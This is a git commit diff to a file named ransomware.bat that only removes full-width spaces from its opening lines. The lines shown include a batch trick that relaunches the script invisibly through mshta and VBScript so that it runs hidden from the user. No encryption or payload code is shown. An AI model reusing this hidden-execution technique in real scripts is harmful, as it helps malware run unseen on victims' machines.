d350fde2b66c9d9f4c3c8d3653649660ab0e177f
Oohyol <Oohyol@163.com>
2020-05-08 11:18:58 +0800

    Update ransomware.bat

--- ransomware.bat
+++ ransomware.bat
@@ -1,10 +1,10 @@
 @echo off 
 
-　　if "%1" == "h" goto begin 
+if "%1" == "h" goto begin 
 
-　　mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit 
+mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit 
 
-　　:begin
+:begin
 
 @shift /0
 REM
